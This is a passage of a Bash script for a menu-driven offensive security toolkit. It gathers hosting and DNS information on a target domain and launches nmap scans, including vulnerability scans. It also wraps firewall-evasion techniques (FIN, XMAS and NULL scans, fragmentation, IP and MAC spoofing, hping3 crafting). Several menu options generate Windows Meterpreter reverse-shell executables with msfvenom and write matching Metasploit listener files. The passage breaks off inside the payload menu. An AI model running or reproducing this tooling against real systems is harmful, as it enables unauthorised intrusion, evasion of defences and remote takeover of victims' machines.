printf "\e[1;92m[*] IP Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $ip_reversedns
fi
##
ipv6=$(grep 'whois6' serverinfo | cut -d "/" -f4 | cut -d "'" -f1 | head -n1)

if [[ $ipv6 != "" ]]; then
echo
printf "\e[1;92m[*] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ipv6
fi
##
host_company=$(grep -o 'Hosting Company .*-.*.' serverinfo | head -n1 | cut -d "-" -f2 | cut -d "." -f1)

if [[ $host_company != "" ]]; then
echo
printf "\e[1;92m[*] Host Company:\e[0m\e[1;77m %s\e[0m\n" $host_company
fi
##
owner_address=$(grep -o 'Owner Address: .*' serverinfo | cut -d ">" -f3 | cut -d "<" -f1)

if [[ $owner_address != "" ]]; then
echo
printf "\e[1;92m[*] Owner Address:\e[0m\e[1;77m %s\e[0m\n" $owner_address
fi
##
hosting_country=$(grep 'Hosting Country:' serverinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)

if [[ $hosting_country != "" ]]; then
echo
printf "\e[1;92m[*] Hosting Country:\e[0m\e[1;77m %s\e[0m\n" $hosting_country
fi

###
hosting_phone=$(grep -o 'Hosting Phone: .*' serverinfo | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $hosting_phone != "" ]]; then
echo
printf "\e[1;92m[*] Hosting Phone:\e[0m\e[1;77m %s\e[0m\n" $hosting_phone
fi

###
hosting_website=$(grep -o 'Hosting Website: .*' serverinfo | grep -o "href=.*" | cut -d "<" -f1 | cut -d ">" -f2)

if [[ $hosting_website != "" ]]; then
echo
printf "\e[1;92m[*] Hosting Website:\e[0m\e[1;77m %s\e[0m\n" $hosting_website
fi

###
dnsNS=$(curl -s "https://dns-api.org/NS/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $dnsNS != "" ]]; then
echo
printf "\e[1;92m[*] NS:\e[0m\e[1;77m %s\e[0m\n" $dnsNS
fi

###
MX=$(curl -s "https://dns-api.org/MX/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $MX != "" ]]; then
echo
printf "\e[1;92m[*] MX:\e[0m\e[1;77m %s\e[0m\n" $MX
fi

if [[ -e serverinfo ]]; then
rm -rf serverinfo
fi

}






#######################################################
# SERVER INFORMATION
#######################################################
function serverinfo() {
clear
banner
echo 
echo 
if [[ -e serverinfo ]]; then
rm -rf serverinfo
fi
echo -e -n $yellow"Please enter your Domain name below"
echo 
echo
echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
read site

curl -s "myip.ms/$site" -L > serverinfo
##
IFS=$'\n'
ip_location=$(grep 'IP Location:' serverinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)

if [[ $ip_location != "" ]]; then
echo
printf "\e[1;92m[*] IP Location:\e[0m\e[1;77m %s\e[0m\n" $ip_location
fi
##

ip_range=$(grep -o 'IP Range .*' serverinfo | head -n1 | cut -d "<" -f2 | cut -d ">" -f2)

if [[ $ip_range != "" ]]; then
echo
printf "\e[1;92m[*] IP Range:\e[0m\e[1;77m %s\e[0m\n" $ip_range
fi

##
ip_reversedns=$(grep 'IP Reverse DNS' serverinfo | grep 'sval' | head -n1 | cut -d ">" -f6 | cut -d "<" -f1)

if [[ $ip_reversedns != "" ]]; then
echo
printf "\e[1;92m[*] IP Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $ip_reversedns
fi
##
ipv6=$(grep 'whois6' serverinfo | cut -d "/" -f4 | cut -d "'" -f1 | head -n1)

if [[ $ipv6 != "" ]]; then
echo
printf "\e[1;92m[*] IPv6:\e[0m\e[1;77m %s\e[0m\n" $ipv6
fi
##
host_company=$(grep -o 'Hosting Company .*-.*.' serverinfo | head -n1 | cut -d "-" -f2 | cut -d "." -f1)

if [[ $host_company != "" ]]; then
echo
printf "\e[1;92m[*] Host Company:\e[0m\e[1;77m %s\e[0m\n" $host_company
fi
##
owner_address=$(grep -o 'Owner Address: .*' serverinfo | cut -d ">" -f3 | cut -d "<" -f1)

if [[ $owner_address != "" ]]; then
echo
printf "\e[1;92m[*] Owner Address:\e[0m\e[1;77m %s\e[0m\n" $owner_address
fi
##
hosting_country=$(grep 'Hosting Country:' serverinfo | grep -o "'cflag .*\'" | cut -d "I" -f1 | cut -d '>' -f1 | tr -d "\'" | cut -d " " -f2)

if [[ $hosting_country != "" ]]; then
echo
printf "\e[1;92m[*] Hosting Country:\e[0m\e[1;77m %s\e[0m\n" $hosting_country
fi

###
hosting_phone=$(grep -o 'Hosting Phone: .*' serverinfo | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $hosting_phone != "" ]]; then
echo
printf "\e[1;92m[*] Hosting Phone:\e[0m\e[1;77m %s\e[0m\n" $hosting_phone
fi

###
hosting_website=$(grep -o 'Hosting Website: .*' serverinfo | grep -o "href=.*" | cut -d "<" -f1 | cut -d ">" -f2)

if [[ $hosting_website != "" ]]; then
echo
printf "\e[1;92m[*] Hosting Website:\e[0m\e[1;77m %s\e[0m\n" $hosting_website
fi

###
dnsNS=$(curl -s "https://dns-api.org/NS/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $dnsNS != "" ]]; then
echo
printf "\e[1;92m[*] NS:\e[0m\e[1;77m %s\e[0m\n" $dnsNS
fi

###
MX=$(curl -s "https://dns-api.org/MX/$site" | grep -o 'value\":.*\"' | cut -d " " -f2 | tr -d '\"')
if [[ $MX != "" ]]; then
echo
printf "\e[1;92m[*] MX:\e[0m\e[1;77m %s\e[0m\n" $MX
fi

if [[ -e serverinfo ]]; then
rm -rf serverinfo
fi
}




#######################################################
# DNS LEAK TEST
#######################################################
function checkdns() {
clear
baner
echo 
echo
echo -e "CHECK WHETHER YOUR DNS LEAKS ANY RECORDS"
echo 
IFS=$'\n'
printf "\n"
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[1/3]...\e[0m\n"
dns1=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns1=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns1" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns1 )
citydns1=$( grep -o "City Location:.*" checkdns1 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns1=$(grep -o 'Country:.*'  checkdns1 | cut -d ">" -f3 | cut -d "&" -f1)
sleep 10
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[2/3]...\e[0m\n"
dns2=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns2=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns2" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns2)
citydns2=$( grep -o "City Location:.*" checkdns2 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns2=$(grep -o 'Country:.*' checkdns2 | cut -d ">" -f3 | cut -d "&" -f1)
sleep 10
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[3/3]...\e[0m\n"
dns3=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns3=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns3" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns3)
citydns3=$( grep -o "City Location:.*" checkdns3 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns3=$(grep -o 'Country:.*' checkdns3 | cut -d ">" -f3 | cut -d "&" -f1)

printf "\n\e[1;93m[*] Results:\e[0m\n"
printf "\n"
printf "\e[1;92mTest 1:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns1 $countrydns1 $citydns1
printf "\e[1;92mTest 2:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns2 $countrydns2 $citydns2
printf "\e[1;92mTest 3:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns3 $countrydns3 $citydns3
printf "\n"
printf "\e[1;93m[*] If you see your city your DNS is leaking\e[0m\n"
printf "\e[1;92m[*] Perform this test more than 1 time for best result\e[0m\n"
if [[ -e checkdns1 ]]; then
rm -rf checkdns1
fi
if [[ -e checkdns2 ]]; then
rm -rf checkdns2
fi
if [[ -e checkdns3 ]]; then
rm -rf checkdns3
fi
}


#######################################################
# Network Scanning
#######################################################
function network(){
clear
banner
echo
echo -e $red "  INTEL GATHERING  $yellow  [NETWORK SCANNING] $red  EXPLOITAION TECH    SSL INFO        "
echo
echo -e $okegreen" ====================================================================="
echo -e $cyan    "      	ADVANCE NETWORK SCANNING TECHNIQUES                     "
echo -e $okegreen" ====================================================================="           
echo ""
echo ""
	  echo -e $white"	[$okegreen"1"$white]$yellow $bold  PORT SCANNING TECHNIQUES"
echo
	  echo -e $white"	[$okegreen"2"$white]$yellow $bold  NMAP SCRIPT ENGINE CATAGORY SCAN TECHNIQUES"
echo
	  echo -e $white"	[$okegreen"3"$white]$yellow $bold  FIREWALL BYPASSING TECHNIQUES"
echo
	  echo -e $white"	[$okegreen"4"$white]$yellow $bold  OWASP-NETTACKER"
echo
	  echo -e $white"	[$okegreen"5"$white]$yellow $bold  MAIN MENU" 
echo -e

echo 
	echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
	read netopt
		if test $netopt == '1'
		then 
		  	netport

		elif test $netopt == '2'
     		then
  			nse
		elif test $netopt == '3'
      		then
       			netfirewall
		elif test $netopt == '4'
      		then
       			owaspnet

    		 elif test $netopt == '5'
         	 then
       	  		  menu
      	  else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            network
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            menu


fi

	
}

function owaspnet() {
clear
echo
banner
echo
echo
echo -e -n "Enter the Domain or Host"
echo
echo
echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
	read dom

xterm -hold -fa monaco -fs 13 -bg black -e ./$owaspnett/nettacker.py -i $dom -m all  &

}

#######################################################
# Network PORT Scanning
#######################################################
function netport() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  $yellow  [NETWORK SCANNING] $red  EXPLOITAION TECH    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                     ADVANCED PORT SCANNING TECHNIQUES                "
echo -e $okegreen" ====================================================================="
echo ""
echo ""
  echo -e $white"	[$okegreen"1"$white]$cyan $bold PING SCAN"
echo
  echo -e $white"	[$okegreen"2"$white]$cyan $bold FULL PORT SCAN (TCP)"
echo
  echo -e $white"	[$okegreen"3"$white]$cyan $bold AGGRESSIVE SCAN "
echo
  echo -e $white"	[$okegreen"4"$white]$cyan $bold FULL PORT SCAN (UDP) "
echo
  echo -e $white"	[$okegreen"5"$white]$cyan $bold DEFAULT SCRIPT SCAN  "
echo
  echo -e $white"	[$okegreen"6"$white]$cyan $bold VERSION DETECTION "
echo
  echo -e $white"	[$okegreen"7"$white]$cyan $bold COMPREHENSIVE SCAN [BEST]  "
echo
  echo -e $white"	[$okegreen"8"$white]$cyan $bold CUSTOM SCAN (OUTPUT IN HTML)  "
echo
  echo -e $white"	[$okegreen"9"$white]$cyan $bold BACK  "
echo -e 
myip
echo 	" "
  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read Scanning
			if test $Scanning == '1'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap  $ip -sn &
			elif test $Scanning == '2'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -sS -p 1-65535 -T4 -vv $ip &
			elif test $Scanning == '3'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -p 1-65535 -T4 -A -vv $ip &
			elif test $Scanning == '4'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
 				read ip
				$xtermnmap -T4 -vv -sU -p 1-65535 $ip &
			elif test $Scanning == '5'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
 				read ip
				$xtermnmap -vv -T4 -A -sC $ip &
			elif test $Scanning == '6'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: "; tput sgr0
 				read ip
				$xtermnmap -vv -T4 -sV $ip &
			elif test $Scanning == '7'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip &
			elif test $Scanning == '8'
			        then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				echo
				echo -ne $okegreen " Which PORT NUMBER you need to scan: " ; tput sgr0
 				read prt
				echo
				echo -ne $okegreen "You can choose the script from the following command (ls /usr/share/nmap/scripts/)"
echo
				echo -ne $okegreen " Enter the script you want to use(i.e ftp-vsftpd-backdoor): " ; tput sgr0
 				read scrpt

   				  nmap -vv -T4 -Pn --script=$scrpt -p $prt  $ip -oX output/$ip-report.xml &
sleep 2
				echo 
				echo
sleep 2
				echo -ne $okegreen "You can Find html File in the output folder." 
					xsltproc output/$ip-report.xml -o output/$ip-report.html

				rm output/$ip-report.xml
                       elif test $Scanning == '9'
          then
           network
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            netport
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            network
     			fi
 }



#######################################################
# NMAP SCRIPT ENGINE CATAGORY SCAN TECHNIQUES
#######################################################
function nse() {
clear
echo 
banner
echo
echo -e $red "  INTEL GATHERING  $yellow  [NETWORK SCANNING] $red  EXPLOITAION TECH    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "             NMAP SCRIPT ENGINE CATAGORY SCAN TECHNIQUES              "
echo -e $okegreen" ====================================================================="                                                                
echo ""
echo ""
  echo -e $white"	[$okegreen"1"$white]$cyan $bold DEFAULT SCAN"
echo
  echo -e $white"	[$okegreen"2"$white]$cyan $bold DISCOVERY SCAN"
echo
  echo -e $white"	[$okegreen"3"$white]$cyan $bold SAFE SCAN "
echo
  echo -e $white"	[$okegreen"4"$white]$cyan $bold VERSION SCAN (UDP) "
echo
  echo -e $white"	[$okegreen"5"$white]$cyan $bold VULNERABILITY SCAN  "
echo
  echo -e $white"	[$okegreen"6"$white]$cyan $bold BACK"
echo
 # echo -e $white"	[$okegreen"7"$white]$cyan $bold MAIN MENU"
echo 
myip
echo
  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read Scannse
			if test $Scannse == '1'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap  -vv -T4 --script default $ip -p 1-65535 &
			elif test $Scannse == '2'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -vv -T4 --script discovery $ip &
			elif test $Scannse == '3'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -vv -T4 --script safe $ip  &
			elif test $Scannse == '4'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
 				read ip
				$xtermnmap -vv -T4 --script version $ip  &
			elif test $Scannse == '5'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
 				read ip
				$xtermnmap -vv -T4 --script vuln $ip  &
			
			elif test $Scannse == '6'
          then
           network
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            nse
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            network
        
fi
                       
 
 }


#######################################################
# FIREWALL BYPASSING TECHNIQUES
#######################################################
function netfirewall() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  $yellow  [NETWORK SCANNING] $red  EXPLOITAION TECH    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                 FIREWALL BYPASSING TECHNIQUES                        "
echo -e $okegreen" ====================================================================="
echo ""
echo ""
  echo -e $white"	[$okegreen"1"$white]$cyan $bold NMAP FIN SCAN"
echo
  echo -e $white"	[$okegreen"2"$white]$cyan $bold NMAP XMAS SCAN"
echo
  echo -e $white"	[$okegreen"3"$white]$cyan $bold NMAP NULL SCAN"
echo
  echo -e $white"	[$okegreen"4"$white]$cyan $bold PACKET FRAGMENTATION"
echo
  echo -e $white"	[$okegreen"5"$white]$cyan $bold IP SPOOFING"
echo
  echo -e $white"	[$okegreen"6"$white]$cyan $bold MAC SPOOFING "
echo
  echo -e $white"	[$okegreen"7"$white]$cyan $bold PACKET CRAFTING TECHNIQUES USING HPING3 "
echo
  echo -e $white"	[$okegreen"8"$white]$cyan $bold BACK"

	echo -e 	" "
myip
echo
  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read fireby
			if test $fireby == '1' #fin scan
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap  -vv -T4 -Pn -sF $ip &
			elif test $fireby == '2' #xmas scan
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -sX -Pn -vv -T4  $ip  &
			elif test $fireby == '3' #null scan
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -sN -Pn -vv -T4  $ip  &
			elif test $fireby == '4' #packet fragmentation
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xtermnmap -f -Pn -vv -T4  $ip  &
			elif test $fireby == '5' #ip spoofing
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				echo 
				echo -ne $okegreen " Enter a Spoofed IP : " ; tput sgr0
				read sip
				echo
				echo -ne $okegreen " Enter your Network interface name (i.e eth0 or wlan0): " ; tput sgr0
				read interface
				$xtermnmap -S $sip -e $interface -Pn -vv -T4  $ip  &
			elif test $fireby == '6' # mac spoofing
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: " ; tput sgr0
 				read ip
				echo 
				echo -ne $okegreen" Enter a MAC vendor to spoof (i.e vendor name or MAC ADDRESS): " ; tput sgr0
				read mac 
				$xtermnmap -vv -T4 --spoof-mac $mac  $ip  &
			elif test $fireby == '7' #packet crafting
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
 				read ip
echo
                                echo -ne  $okegreen" Enter the Source Port Number : "; tput sgr0
 				read sport
echo

				echo -ne  $okegreen" Enter the Port Number : "; tput sgr0
 				read port
echo
			echo -e $red" ####################################################### "
			echo -e     " #                     SYN PING                        # "
			echo -e     " ####################################################### " $yellow
			echo
				hping3 -S -s $sport $ip -p $port -c 4
echo
			echo -e $red" ####################################################### "
			echo -e     " #                     FYN PING                        # "
			echo -e     " ####################################################### " $yellow
			echo
				hping3 -F -s $sport $ip -p $port -c 4
echo
			echo -e $red" ####################################################### "
			echo -e     " #                     ACK PING                        # "
			echo -e     " ####################################################### " $yellow
			echo
				hping3 -A -s $sport $ip -p $port -c 4
echo
			echo -e $red" ####################################################### "
			echo -e     " #                     UDP PING                        # "
			echo -e     " ####################################################### " $yellow
			echo
				hping3 -2 -s $sport $ip -p $port -c 4
			elif test $fireby == '8'
          then
           network
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            netfirewall
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            network
        
fi
                       
 
 }


#######################################################
# METASPLOIT TECHNIQUES
#######################################################
function metasploit() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  NETWORK SCANNING $yellow [EXPLOITATION TECH] $red    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                      EXPLOITATION TECHNIQUES                         "
echo -e $okegreen" ====================================================================="                                                             
echo ""
echo ""
  echo -e $white $bold "	[$okegreen"1"$white]$cyan $bold CREATE PAYLOAD & LISTENER"
echo
  echo -e $white $bold "	[$okegreen"2"$white]$cyan $bold REVERSE SHELL CREATION"
echo  
  echo -e $white$bold  "	[$okegreen"3"$white]$cyan $bold MSF EXPLOIT"
echo  
  echo -e $white$bold  "	[$okegreen"4"$white]$cyan $bold FINDING EXPLOIT"
echo  
  echo -e $white$bold  "	[$okegreen"5"$white]$cyan $bold MAIN MENU"
	echo -e 	" "
  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read Metasploit
			if test $Metasploit == '1'
				then
				payload	 
			elif test $Metasploit == '2'
				then
				reversesh
			elif test $Metasploit == '3'
				then
				msfvuln
			elif test $Metasploit == '4'
				then
				searchsplt
			elif test $Metasploit == '5'
          then
           menu
        else
            echo ""
            echo -e $okegreen " Incorrect Number"
          fi
          echo ""
          echo ""
          echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
        read back
        if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
            then
            clear
            metasploit
        elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
            then
            menu
        
fi
                       
 
 }

#######################################################
# Finding exploit
#######################################################
function searchsplt() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  NETWORK SCANNING $yellow [EXPLOITATION TECH] $red    SSL INFO        "
echo
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                      EXPLOITATION TECHNIQUES                         "
echo -e $okegreen" ====================================================================="
echo 
echo
echo -e -n  $red" Enter the keyword you want to search:"
echo
echo

echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read sploit
sleep 2
    xterm -hold -fa monaco -fs 13 -bg black -e searchsploit $sploit

}



#######################################################
# CREATE PAYLOAD & LISTENER
#######################################################
function payload() {
clear
banner
echo
echo -e $red "  INTEL GATHERING  NETWORK SCANNING $yellow [EXPLOITATION TECH] $red    SSL INFO        "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan    "                     CREATE PAYLOAD & LISTENER            "
echo -e $okegreen" ====================================================================="
echo ""
echo ""
  echo -e $white"	[$okegreen"1"$white]$cyan $bold WINDOWS X86 REV. (METERPRETER)"
echo
  echo -e $white"	[$okegreen"2"$white]$cyan $bold WINDOWS X64 REV. (METERPRETER)"
echo
  echo -e $white"	[$okegreen"3"$white]$cyan $bold WINDOWS X86 REV. STAGELESS (METERPRETER)"
echo
  echo -e $white"	[$okegreen"4"$white]$cyan $bold WINDOWS X64 REV. STAGELESS (METERPRETER)"
echo
  echo -e $white"	[$okegreen"5"$white]$cyan $bold WINDOWS X86 REV. VNC (METERPRETER)"
echo
  echo -e $white"	[$okegreen"6"$white]$cyan $bold WINDOWS PHP REV (METERPRETER)"
echo
  #echo -e $white"	[$okegreen"7"$white]$cyan $bold WINDOWS ASP.NET REV. (METERPRETER)"
  echo -e $white"	[$okegreen"7"$white]$cyan $bold BACK"
	echo -e 	" "
echo
echo
myip
echo
echo
  echo -n -e $red'  \033[4mBriskInfosec@Sec:\033[0m>> '; tput sgr0 #insert your choice
      read pyld
			if test $pyld == '1'
				then
				echo 
				echo -ne $okegreen " What is your LHOST(Your IP is = $red $bold $ip $okegreen ): " ; tput sgr0
 				read lhost
				echo				
				echo -ne $okegreen " What is your LPORT: " ; tput sgr0
				read lport
				echo 
				echo -ne $okegreen " Enter the ouput file name (without extension): " ; tput sgr0
				read outfile
				echo
				payload=windows/meterpreter/reverse_tcp
				$xtermpay -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o output/$outfile.exe
				echo -e $okegreen " $outfile.exe has been created and found in OUTPUT folder " 
				echo 
				echo -e "####################################################### "
				echo -e "	            CREATING LISTENER FILE               " 
				echo -e "########################################################"$white
				touch handler/$outfile.rc
				echo use exploit/multi/handler >> handler/$outfile.rc
				echo set PAYLOAD $payload >> handler/$outfile.rc
				echo set LHOST $lhost >> handler/$outfile.rc
				echo set LPORT $lport >> handler/$outfile.rc
				echo set ExitOnSession false >> handler/$outfile.rc
				echo exploit -j >> handler/$outfile.rc
				echo
				echo -e $yellow"RC file has been Created : handler/$outfile.rc "$white
				echo 
				echo -e $yellow"To RUN RC FILE, run using the command msfconsole -r $outfile.rc"$white	
				echo
			elif test $pyld == '2'
				then
				echo 
				echo -ne $okegreen " What is your LHOST (Your IP is = $red $bold $ip $okegreen ): " ; tput sgr0
 				read lhost
				echo				
				echo -ne $okegreen " What is your LPORT: " ; tput sgr0
				read lport
				echo 
				echo -ne $okegreen " Enter the ouput file name (without extension): " ; tput sgr0
				read outfile
				echo
				payload=windows/x64/meterpreter/reverse_tcp
				$xtermpay -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o output/$outfile.exe 
				echo -e $okegreen " $outfile.exe has been created and found in OUTPUT folder " 
				echo 
				echo -e "####################################################### "
				echo -e "	            CREATING LISTENER FILE               " 
				echo -e "########################################################"$white
				touch handler/$outfile.rc
				echo use exploit/multi/handler >> handler/$outfile.rc
				echo set PAYLOAD $payload >> handler/$outfile.rc
				echo set LHOST $lhost >> handler/$outfile.rc
				echo set LPORT $lport >> handler/$outfile.rc
				echo set ExitOnSession false >> handler/$outfile.rc
				echo exploit -j >> handler/$outfile.rc
				echo
				echo -e $yellow"RC file has been Created : handler/$outfile.rc "$white
				echo 
				echo -e $yellow"To RUN RC FILE, run using the command msfconsole -r $outfile.rc"$white	
				echo
			elif test $pyld == '3'
				then
				echo 
				echo -ne $okegreen " What is your LHOST (Your IP is = $red $bold $ip $okegreen ): " ; tput sgr0
 				read lhost
				echo				
				echo -ne $okegreen " What is your LPORT: " ; tput sgr0
				read lport
				echo 
				echo -ne $okegreen " Enter the ouput file name (without extension): " ; tput sgr0
				read outfile
				echo
				payload=windows/meterpreter_reverse_tcp
				$xtermpay -p windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o output/$outfile.exe 
				echo -e $okegreen " $outfile.exe has been created and found in OUTPUT folder " 
				echo 
				echo -e "####################################################### "
				echo -e "	            CREATING LISTENER FILE               " 
				echo -e "########################################################"$white
				touch handler/$outfile.rc
				echo use exploit/multi/handler >> handler/$outfile.rc
				echo set PAYLOAD $payload >> handler/$outfile.rc
				echo set LHOST $lhost >> handler/$outfile.rc
				echo set LPORT $lport >> handler/$outfile.rc
				echo set ExitOnSession false >> handler/$outfile.rc
				echo exploit -j >> handler/$outfile.rc
				echo
				echo -e $yellow"RC file has been Created : handler/$outfile.rc "$white
				echo 
				echo -e $yellow"To RUN RC FILE, run using the command msfconsole -r $outfile.rc"$white	
				echo
			elif test $pyld == '4'
				then
				echo 
				echo -ne $okegreen " What is your LHOST (Your IP is = $red $bold $ip $okegreen ): " ; tput sgr0
 				read lhost
				echo				
				echo -ne $okegreen " What is your LPORT: " ; tput sgr0
				read lport
				echo 
				echo -ne $okegreen " Enter the ouput file name (without extension): " ; tput sgr0
				read outfile
				echo
				payload=windows/x64/meterpreter_reverse_tcp
				$xtermpay -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o output/$outfile.exe 
				echo -e $okegreen " $outfile.exe has been created and found in OUTPUT folder " 
				echo 
				echo -e "####################################################### "
				echo -e "	            CREATING LISTENER FILE               " 
				echo -e "########################################################"$white
				touch handler/$outfile.rc
				echo use exploit/multi/handler >> handler/$outfile.rc
				echo set PAYLOAD $payload >> handler/$outfile.rc
				echo set LHOST $lhost >> handler/$outfile.rc
				echo set LPORT $lport >> handler/$outfile.rc
				echo set ExitOnSession false >> handler/$outfile.rc
				echo exploit -j >> handler/$outfile.rc
				echo
				echo -e $yellow"RC file has been Created : handler/$outfile.rc "$white
				echo 
